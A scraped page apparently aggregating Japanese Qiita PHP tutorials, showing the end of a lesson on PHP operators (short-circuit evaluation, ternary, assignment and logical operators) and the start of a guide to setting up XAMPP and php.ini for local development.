<p>として先に足し算を行うことを明示するか、今回のケースでは <code>echo</code> の<ins>複数パラメータを渡す</ins>構文を用いて</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">echo</span> <span class="s1">'one plus three equals '</span><span class="p">,</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">3</span><span class="p">,</span> <span class="s1">' !!'</span><span class="p">;</span> 
</pre></div></div>

<p>とすることも出来ます。後者は</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">echo</span> <span class="s1">'one plus three equals '</span><span class="p">;</span>
<span class="k">echo</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">3</span><span class="p">;</span>
<span class="k">echo</span> <span class="s1">' !!'</span><span class="p">;</span> 
</pre></div></div>

<p>と全く同じことを意味します。</p>

<h1>
<span id="8--" class="fragment"></span><a href="#8--"><i class="fa fa-link"></i></a>8. <code>&lt;&lt;</code> <code>&gt;&gt;</code>
</h1>

<p><strong>ビットシフト</strong> を行います。全ての値は<ins>整数型</ins>に変換されます。</p>

<h1>
<span id="9----10-----" class="fragment"></span><a href="#9----10-----"><i class="fa fa-link"></i></a>　9. <code>&lt;</code> <code>&lt;=</code> <code>&gt;</code> <code>&gt;=</code><br>10. <code>==</code> <code>!=</code> <code>===</code> <code>!==</code> <code>&lt;&gt;</code><br>
</h1>

<ul>
<li>2つの値を比較し、結果を論理値 <code>TRUE</code> <code>FALSE</code> のどちらかで返します。</li>
<li>比較規則の詳細に関しては <strong>「緩やかな比較と厳密な比較」</strong> で触れることにします。</li>
</ul>

<h1>
<span id="11-12-13-" class="fragment"></span><a href="#11-12-13-"><i class="fa fa-link"></i></a>11. <code>&amp;</code><br>12. <code>^</code><br>13. <code>|</code><br>
</h1>

<p><strong>ビット演算</strong> を行います。全ての値は<ins>整数型</ins>に変換されます。</p>

<h1>
<span id="14--" class="fragment"></span><a href="#14--"><i class="fa fa-link"></i></a>14. <code>&amp;&amp;</code> <code>||</code>
</h1>

<p>これらは <strong>論理演算子</strong> と呼ばれます。全ての値は<ins>論理型</ins>に変換されます。</p>

<h2>
<span id="14-1-" class="fragment"></span><a href="#14-1-"><i class="fa fa-link"></i></a>14-1. <code>&amp;&amp;</code>
</h2>

<p><strong>「且つ」</strong> を表します。</p>

<h2>
<span id="14-2-" class="fragment"></span><a href="#14-2-"><i class="fa fa-link"></i></a>14-2. <code>||</code>
</h2>

<p><strong>「又は」</strong> を表します。</p>

<h2>
<span id="14-3-副作用完了点について" class="fragment"></span><a href="#14-3-%E5%89%AF%E4%BD%9C%E7%94%A8%E5%AE%8C%E4%BA%86%E7%82%B9%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a>14-3. 副作用完了点について</h2>

<p>ビット演算子と論理演算子の違いについて考えてみましょう。ビット演算で <strong>論理値(整数の <code>0</code> <code>1</code> )</strong> のみを扱うケースを考えます。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$a</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
<span class="nv">$b</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span>
    <span class="nv">$a</span> <span class="o">&amp;</span> <span class="nv">$b</span><span class="p">,</span>
    <span class="nv">$a</span> <span class="o">&amp;&amp;</span> <span class="nv">$b</span>
<span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>int(0)
bool(false)
</pre></div>
</div>

<p>論理値としてはどちらも <code>FALSE</code> になるので、どちらを用いてもいいと思われるかもしれませんが、これは <strong>副作用</strong> が無い場合に限定されます。</p>

<p><strong>【副作用】</strong><br>
式が条件判定に使われるだけでなく、<ins>変数の値の変更</ins>や<ins>標準出力</ins>が起きること。</p>

<p>例えば下記のケースでは実行結果が異なります。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$i</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="nb">var_dump</span><span class="p">(</span>
    <span class="o">++</span><span class="nv">$i</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">|</span> <span class="o">++</span><span class="nv">$i</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span>
    <span class="o">++</span><span class="nv">$i</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">||</span> <span class="o">++</span><span class="nv">$i</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span>
    <span class="nv">$i</span>
<span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>int(1)
bool(true)
array(4) {
  [0]=&gt;
  int(1)
  [1]=&gt;
  int(1)
  [2]=&gt;
  int(1)
  [3]=&gt;
  int(0)
}
</pre></div>
</div>

<p><code>$i[1]</code> と <code>$i[3]</code> の値が異なっていますね。この現象について考察してみましょう。<code>|</code> と <code>||</code> はどちらも左側から評価される点に着目します。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="o">++</span><span class="nv">$i</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">|</span> <span class="o">++</span><span class="nv">$i</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</pre></div></div>

<p>ビット演算子を用いたケースでは、如何なる場合においても <code>++$i[0]</code> と <code>++$i[1]</code> は実行されます。ところが…</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="o">++</span><span class="nv">$i</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">||</span> <span class="o">++</span><span class="nv">$i</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
</pre></div></div>

<p>これは <code>++$i[2]</code> が <code>1</code> となり、この<ins>式全体が <code>TRUE</code> となることが確定</ins>したので、 <code>++$i[3]</code> の評価は行われなかったのです。一方、<code>&amp;&amp;</code> の場合は<ins>式全体が <code>FALSE</code> となることが確定</ins>した時点で評価は終了します。</p>

<p>これらの評価が終了する点のことを <strong>副作用完了点</strong> と呼びます。今まで何気なく書いてきたif文も、この性質を盛んに利用しています。典型的な例が <code>isset</code> におけるチェックです。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">],</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
<span class="p">}</span>
</pre></div></div>

<p>もしこれが</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">])</span> <span class="o">&amp;</span> <span class="nb">is_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">],</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
<span class="p">}</span>
</pre></div></div>

<p>であったとしたら、変数が未定義の場合でも <code>is_string</code> が実行され、 <strong>Notice</strong> が発生してしまうことになるでしょう。</p>

<h1>
<span id="15--" class="fragment"></span><a href="#15--"><i class="fa fa-link"></i></a>15. <code>?</code> <code>:</code>
</h1>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$a</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
</pre></div></div>

<p><strong>三項演算子</strong> と呼ばれます。 if～else文における<ins>同一の変数に対する代入</ins>を簡略化する役割を持ちます。詳しくは「制御構造と関数」にて扱いますが、形式だけ軽く紹介しておきます。</p>

<h3>
<span id="条件式--条件式がtrueのときの値--条件式がfalseのときの値" class="fragment"></span><a href="#%E6%9D%A1%E4%BB%B6%E5%BC%8F--%E6%9D%A1%E4%BB%B6%E5%BC%8F%E3%81%8Ctrue%E3%81%AE%E3%81%A8%E3%81%8D%E3%81%AE%E5%80%A4--%E6%9D%A1%E4%BB%B6%E5%BC%8F%E3%81%8Cfalse%E3%81%AE%E3%81%A8%E3%81%8D%E3%81%AE%E5%80%A4"><i class="fa fa-link"></i></a>条件式 <code>?</code> 条件式がTRUEのときの値 <code>:</code> 条件式がFALSEのときの値</h3>

<h1>
<span id="16--------------" class="fragment"></span><a href="#16--------------"><i class="fa fa-link"></i></a>16. <code>=</code> <code>+=</code> <code>-=</code> <code>*=</code> <code>/=</code> <code>.=</code> <code>%=</code> <code>&amp;=</code> <code>|=</code> <code>^=</code> <code>&lt;&lt;=</code> <code>&gt;&gt;=</code> <code>=&gt;</code>
</h1>

<p>これらは <strong>代入演算子</strong> と呼ばれます。</p>

<h2>
<span id="16-1-" class="fragment"></span><a href="#16-1-"><i class="fa fa-link"></i></a>16-1. <code>=</code>
</h2>

<p>最も基本的な代入演算子です。 <ins>右から左</ins>への代入を行います。代入演算子は、代入を行った後に<ins>式として代入した値を返す</ins>特性があります。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nb">var_dump</span><span class="p">(</span><span class="nv">$v</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'A'</span><span class="p">,</span> <span class="nv">$v</span><span class="p">);</span>
</pre></div>
</div>

<p><code>$v[] = 'A'</code> は代入した <code>"A"</code> を返しています。</p>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>string(1) "A"
array(1) {
  [0]=&gt;
  string(1) "A"
}
</pre></div>
</div>

<p>これを利用して、コードを短く出来ることがあります。例えばこんなケース。</p>

<h4>
<span id="例1-一斉に代入" class="fragment"></span><a href="#%E4%BE%8B1-%E4%B8%80%E6%96%89%E3%81%AB%E4%BB%A3%E5%85%A5"><i class="fa fa-link"></i></a>例1： 一斉に代入</h4>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">Before</span></div>
<div class="highlight"><pre><span></span><span class="nv">$a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="nv">$b</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="nv">$c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">After</span></div>
<div class="highlight"><pre><span></span><span class="nv">$a</span> <span class="o">=</span> <span class="nv">$b</span> <span class="o">=</span> <span class="nv">$c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</pre></div>
</div>

<h4>
<span id="例2-チェック中に代入" class="fragment"></span><a href="#%E4%BE%8B2-%E3%83%81%E3%82%A7%E3%83%83%E3%82%AF%E4%B8%AD%E3%81%AB%E4%BB%A3%E5%85%A5"><i class="fa fa-link"></i></a>例2： チェック中に代入</h4>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">Before</span></div>
<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$a</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">After</span></div>
<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_string</span><span class="p">(</span><span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</div>

<p>また、 <ins>代入される変数に隣接する演算子の優先度が変化</ins>することがあります。これも同様に簡略化に役立つことがあります。</p>

<h4>
<span id="例3-代入結果の否定" class="fragment"></span><a href="#%E4%BE%8B3-%E4%BB%A3%E5%85%A5%E7%B5%90%E6%9E%9C%E3%81%AE%E5%90%A6%E5%AE%9A"><i class="fa fa-link"></i></a>例3： 代入結果の否定</h4>

<p><code>strlen</code> は文字列のバイト長を返す関数です。</p>

<p><strong>strlen</strong><br>
<a href="http://php.net/manual/ja/function.strlen.php" class="autolink" rel="nofollow noopener" target="_blank">http://php.net/manual/ja/function.strlen.php</a></p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">Before</span></div>
<div class="highlight"><pre><span></span><span class="nv">$str</span> <span class="o">=</span> <span class="s1">'hogehoge'</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$length</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$str</span><span class="p">)))</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"This string is empty"</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"This string has </span><span class="si">{</span><span class="nv">$length</span><span class="si">}</span><span class="s2"> bytes."</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">After</span></div>
<div class="highlight"><pre><span></span><span class="nv">$str</span> <span class="o">=</span> <span class="s1">'hogehoge'</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$length</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$str</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"This string is empty"</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"This string has </span><span class="si">{</span><span class="nv">$length</span><span class="si">}</span><span class="s2"> bytes."</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<h2>
<span id="16-2------------" class="fragment"></span><a href="#16-2------------"><i class="fa fa-link"></i></a>16-2. <code>+=</code> <code>-=</code> <code>*=</code> <code>/=</code> <code>.=</code> <code>%=</code> <code>&amp;=</code> <code>|=</code> <code>^=</code> <code>&lt;&lt;=</code> <code>&gt;&gt;=</code>
</h2>

<p>これらは全て<ins>計算した結果をもう一度代入し直す</ins>という動作をします。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$j</span> <span class="o">=</span> <span class="nv">$k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span>
    <span class="nv">$i</span> <span class="o">=</span> <span class="nv">$i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span>
    <span class="nv">$j</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">,</span>
    <span class="o">++</span><span class="nv">$k</span>
<span class="p">);</span>
</pre></div>
</div>

<p>上の3つの式は全て等価です。</p>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>int(1)
int(1)
int(1)
</pre></div>
</div>

<p>なお、<code>$k++</code> とするのは意味が異なるので注意してください。</p>

<h2>
<span id="16-3-" class="fragment"></span><a href="#16-3-"><i class="fa fa-link"></i></a>16-3. <code>=&gt;</code>
</h2>

<p>これは一応代入演算子には分類されますが、 <strong>ダブルアロー演算子</strong> の名前の方が有名です。配列の初期化代入にのみ使用され、他とは性質が大きく異なるので、どちらかと言えば<ins>言語構文</ins>に近いものとして認知すべきでしょう。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="s1">'a'</span> <span class="o">=&gt;</span> <span class="s1">'A'</span><span class="p">,</span>
    <span class="s1">'b'</span> <span class="o">=&gt;</span> <span class="s1">'B'</span><span class="p">,</span>
<span class="p">);</span>
</pre></div></div>

<h1>
<span id="17-and18-xor19-or" class="fragment"></span><a href="#17-and18-xor19-or"><i class="fa fa-link"></i></a>17. <code>and</code><br>18. <code>xor</code><br>19. <code>or</code>
</h1>

<p>これらの役割はそれぞれ <code>&amp;&amp;</code> <code>^</code> <code>||</code> と全く同じですが、優先度が異なります。</p>

<h3>
<span id="----代入演算子--and-xor-or" class="fragment"></span><a href="#----%E4%BB%A3%E5%85%A5%E6%BC%94%E7%AE%97%E5%AD%90--and-xor-or"><i class="fa fa-link"></i></a><code>&amp;&amp;</code> <code>^</code> <code>||</code> ＞ 代入演算子 ＞ <code>and</code> <code>xor</code> <code>or</code>
</h3>

<h4>
<span id="例-ファイルポインタのオープン" class="fragment"></span><a href="#%E4%BE%8B-%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%83%9D%E3%82%A4%E3%83%B3%E3%82%BF%E3%81%AE%E3%82%AA%E3%83%BC%E3%83%97%E3%83%B3"><i class="fa fa-link"></i></a>例. ファイルポインタのオープン</h4>

<p><code>die</code> はスクリプトの実行を強制的に中断する言語構文です。下記の例ではファイルが開けなかったときにエラーメッセージを出して強制終了します。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="s1">'data.txt'</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">'Failed to open data.txt'</span><span class="p">);</span>
</pre></div></div>

<h3>
<span id="どうして--って存在しないの" class="fragment"></span><a href="#%E3%81%A9%E3%81%86%E3%81%97%E3%81%A6--%E3%81%A3%E3%81%A6%E5%AD%98%E5%9C%A8%E3%81%97%E3%81%AA%E3%81%84%E3%81%AE"><i class="fa fa-link"></i></a>どうして <code>^^</code> って存在しないの？</h3>

<p>ここに目をつけてくれた人はなかなか鋭いですね。 <code>&amp;&amp;</code> 演算子や <code>||</code> 演算子は式の左側を見ただけで結果を決めることがあると先ほど紹介しましたが、それに倣って <code>^^</code> 演算子を実装するとしても <strong>「どちらか一方が <code>TRUE</code> ならば～」</strong> という条件になるので、<ins>両側を見ることが確定</ins>してしまっており、結果的にはビット演算の <code>^</code> で十分だと言えるのが要因です。</p>

<h1>
<span id="20-" class="fragment"></span><a href="#20-"><i class="fa fa-link"></i></a>20. <code>,</code>
</h1>

<p>さまざまな利用法(マニュアルよりそのまま言葉引用)</p>

<p>演算子は以上です。お疲れ様でした、徐々に覚えていきましょう。次回は <strong>「緩やかな比較と厳密な比較」</strong> について学びます。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />49位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>18</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/4508dc677b11e487effc">【PHP入門講座】 PHPを使うための準備</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-11-25 03:44:51</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP入門講座]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h3>
<span id="目次に戻る" class="fragment"></span><a href="#%E7%9B%AE%E6%AC%A1%E3%81%AB%E6%88%BB%E3%82%8B"><i class="fa fa-link"></i></a><a href="http://qiita.com/items/752e19a578cf7d96fc5f">目次に戻る</a>
</h3>

<h1>
<span id="前書き" class="fragment"></span><a href="#%E5%89%8D%E6%9B%B8%E3%81%8D"><i class="fa fa-link"></i></a>前書き</h1>

<p>記念すべき第1回目・・・方針とか途中で大きく変わるかもしれないけど、あんまりそういうこと気にしてても手が動かないのでとりあえず書いてみます。OSは <strong>Windows</strong> を想定しています。</p>

<h1>
<span id="xamppの準備" class="fragment"></span><a href="#xampp%E3%81%AE%E6%BA%96%E5%82%99"><i class="fa fa-link"></i></a>XAMPPの準備</h1>

<h2>
<span id="xamppとは" class="fragment"></span><a href="#xampp%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>XAMPPとは？</h2>

<p>以下のものが一式揃っています。</p>

<h3>
<span id="apache" class="fragment"></span><a href="#apache"><i class="fa fa-link"></i></a>Apache</h3>

<p>世界中でもっとも使われているWebサーバソフトウェア。<code>http://localhost/sample/index.php</code> のようなURLでコンピュータ上の <code>C:\xampp\htdocs\sample\index.php</code> にアクセスできるようにするためのもの。ちなみに <strong>コンピュータ上のファイルを直接 <code>file:///c:/xampp/htdocs/sample/index.php</code> のようにWebブラウザから開いてもPHPは実行されない</strong> ので注意。</p>

<h3>
<span id="mysql" class="fragment"></span><a href="#mysql"><i class="fa fa-link"></i></a>MySQL</h3>

<p>世界でもっとも普及しているオープンソース・データベース。データベースとは、多数のユーザー情報をまとめて管理したりするためのシステムのことを指す。</p>

<h3>
<span id="perl" class="fragment"></span><a href="#perl"><i class="fa fa-link"></i></a>Perl</h3>

<p>PHPの大先輩であるプログラミング言語。最近は廃れてきている。</p>

<h3>
<span id="php" class="fragment"></span><a href="#php"><i class="fa fa-link"></i></a>PHP</h3>

<p>メインディッシュ。</p>

<p>XAMPPはこれら全てをまとめてほぼ全自動でインストールしてくれる上に、 <strong>XAMPP Control Panel</strong>　から一括管理することができ、非常に便利です。なお、実際にWebサーバーとして公開する場合は、XAMPPを使用するよりも個別にインストールを行ったほうが逆に融通が利くようですが、今回は目的があくまでローカル環境の構築なのでXAMPPに頼ることにします。</p>

<h2>
<span id="xamppのxって何" class="fragment"></span><a href="#xampp%E3%81%AEx%E3%81%A3%E3%81%A6%E4%BD%95"><i class="fa fa-link"></i></a>XAMPPの「X」って何？</h2>

<ul>
<li>Windows向けの <strong>WAMP</strong>
</li>
<li>Mac向けの <strong>MAMP</strong>
</li>
<li>Linux向けの <strong>LAMP</strong>
</li>
</ul>

<p>これらのバラバラのソフトウェアが全OSに対応されたという意味の <strong>X</strong>  らしいです。</p>

<h2>
<span id="ダウンロードする" class="fragment"></span><a href="#%E3%83%80%E3%82%A6%E3%83%B3%E3%83%AD%E3%83%BC%E3%83%89%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>ダウンロードする</h2>

<p><strong>XAMPP for Windows</strong><br>
<a href="http://www.apachefriends.org/jp/xampp-windows.html" class="autolink" rel="nofollow noopener" target="_blank">http://www.apachefriends.org/jp/xampp-windows.html</a></p>

<p>こちらから最新版をダウンロードしてください。パッケージは <strong>Installer</strong> 版がオススメです。</p>

<h2>
<span id="インストールする" class="fragment"></span><a href="#%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>インストールする</h2>

<del>Installer版を使えば何も考えなくていいｗｗｗｗｗｗｗｗｗｗｗｗｗｗｗｗｗｗｗｗｗｗｗ</del>

<h2>
<span id="コントロールパネルを起動する" class="fragment"></span><a href="#%E3%82%B3%E3%83%B3%E3%83%88%E3%83%AD%E3%83%BC%E3%83%AB%E3%83%91%E3%83%8D%E3%83%AB%E3%82%92%E8%B5%B7%E5%8B%95%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>コントロールパネルを起動する</h2>

<p>インストールが終わったら <strong>XAMPP Control Panel</strong> を起動してください。そして <strong>Apache</strong> と <strong>MySQL</strong> を開始し、正しく <strong>Running</strong> になるかどうか確認してください。</p>

<h2>
<span id="webブラウザからアクセスする" class="fragment"></span><a href="#web%E3%83%96%E3%83%A9%E3%82%A6%E3%82%B6%E3%81%8B%E3%82%89%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>Webブラウザからアクセスする</h2>

<p><a href="http://localhost/" rel="nofollow noopener" target="_blank">http://localhost/</a> にアクセスして</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>It works!
</pre></div></div>

<p>と表示されれば成功。次からxamppフォルダ化にある <strong>htdocs</strong> フォルダにファイルを入れると、 <strong><code>http://localhost/</code></strong> をルートパスとしてApache経由でアクセス出来るようになります。</p>

<h1>
<span id="セキュリティ設定" class="fragment"></span><a href="#%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E8%A8%AD%E5%AE%9A"><i class="fa fa-link"></i></a>セキュリティ設定</h1>

<p>XAMPPはそのままでは <strong>非常に危険</strong> な状態なので、下記2項目の設定を行ってセキュリティを高めましょう。</p>

<ul>
<li>MySQLのルートパスワード設定</li>
<li>XAMPPのディレクトリ制御設定</li>
</ul>

<ol>
<li>
<a href="http://localhost/security/xamppsecurity.php" rel="nofollow noopener" target="_blank">http://localhost/security/xamppsecurity.php</a> にアクセス。</li>
<li>それぞれの項目を設定。(ラジオボタンやチェックボックスは初期値でOK)</li>
</ol>

<h1>
<span id="phpini-の編集" class="fragment"></span><a href="#phpini-%E3%81%AE%E7%B7%A8%E9%9B%86"><i class="fa fa-link"></i></a>php.ini の編集</h1>

<p>XAMPP Control Panel の Apache について、「Config」→「PHP(php.ini)」を開いてPHPの設定を行います。<code>；</code> が先頭についている行は全てコメントです。コメントアウトされている行の <code>;</code> を削除して設定を変更することもありますが、ここでは全て<ins>コメントでない行</ins>を編集する前提とします。</p>

<h2>
<span id="error_reporting" class="fragment"></span><a href="#error_reporting"><i class="fa fa-link"></i></a>error_reporting</h2>

<p>エラー表示を行う内容。<br>
<code>error_reporting = E_ALL | E_STRICT</code> <br>
として(あらゆるPHPバージョンで)全てのエラーを表示する設定にする。</p>

<h2>
<span id="display_errors" class="fragment"></span><a href="#display_errors"><i class="fa fa-link"></i></a>display_errors</h2>

<p>エラー表示機能自体をONにするかOFFにするか。<br>
<code>display_errors = On</code><br>
としてエラーを表示させる。</p>

<p>最低限この2項目の編集・確認だけは行っておきましょう。なお、設定を適用するには<ins>Apacheを再起動</ins>する必要があります。</p>

<h1>
<span id="テキストエディタの導入" class="fragment"></span><a href="#%E3%83%86%E3%82%AD%E3%82%B9%E3%83%88%E3%82%A8%E3%83%87%E3%82%A3%E3%82%BF%E3%81%AE%E5%B0%8E%E5%85%A5"><i class="fa fa-link"></i></a>テキストエディタの導入</h1>

<p>皆さんはテキストエディタには何を使われていますか？</p>

<h2>
<span id="自分でインストールしたエディタを使っている" class="fragment"></span><a href="#%E8%87%AA%E5%88%86%E3%81%A7%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%81%97%E3%81%9F%E3%82%A8%E3%83%87%E3%82%A3%E3%82%BF%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%A6%E3%81%84%E3%82%8B"><i class="fa fa-link"></i></a>自分でインストールしたエディタを使っている</h2>

<p>以下のような標準設定にしてください。</p>

<ul>
<li>文字コード<br> <strong>UTF-8(BOM無し)</strong>
</li>
<li>改行コード<br> <strong>LF(UNIXフォーマット)</strong>
</li>
</ul>

<h2>
